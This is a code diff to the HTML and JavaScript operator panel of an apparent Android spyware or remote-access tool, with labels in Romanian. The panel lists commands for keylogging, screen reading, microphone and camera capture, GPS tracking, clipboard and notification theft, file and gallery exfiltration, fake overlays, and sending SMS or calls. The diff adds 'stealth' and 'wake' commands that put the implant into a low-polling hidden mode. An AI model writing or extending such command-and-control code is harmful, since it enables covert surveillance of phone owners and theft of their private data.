@@ -1431,6 +1431,8 @@ img.shot{max-width:200px;border-radius:6px;margin:4px}
 <option value="call">call — sună număr</option>
 <option value="network">network — WiFi + IP</option>
 <option value="storage_list">storage_list — listare fișiere</option>
+<option value="stealth">stealth — mod dormit (10 min polling)</option>
+<option value="wake">wake — activează din mod dormit</option>
 <option value="ping">ping — test legătură</option>
 <option value="kill">kill — forță stop app</option>
 <option value="status">status — permisiuni + stare</option>
@@ -1467,7 +1469,7 @@ function updParams(){
   const a=document.getElementById("cmdAction").value;
   const d={screenshot:{},screen_text:{},keylog:{},clipboard:{},mic:{ms:10000},camera:{},gps:{},
   gps_track:{ms:60000,everyMs:5000},device:{},apps:{},foreground:{},recent:{},usage:{},
-  notifications:{},exfil_file:{uri:""},exfil_gallery:{limit:10,since:null},overlay:{type:"wifi",title:"",body:""},contacts:{},sms_send:{to:"",msg:""},call:{number:""},network:{},storage_list:{dir:"DCIM",limit:30},ping:{},kill:{},status:{}};
+  notifications:{},exfil_file:{uri:""},exfil_gallery:{limit:10,since:null},overlay:{type:"wifi",title:"",body:""},contacts:{},sms_send:{to:"",msg:""},call:{number:""},network:{},storage_list:{dir:"DCIM",limit:30},stealth:{},wake:{},ping:{},kill:{},status:{}};
   document.getElementById("cmdParams").value=JSON.stringify(d[a]||{},null,2);
 }
 async function sendPing(){
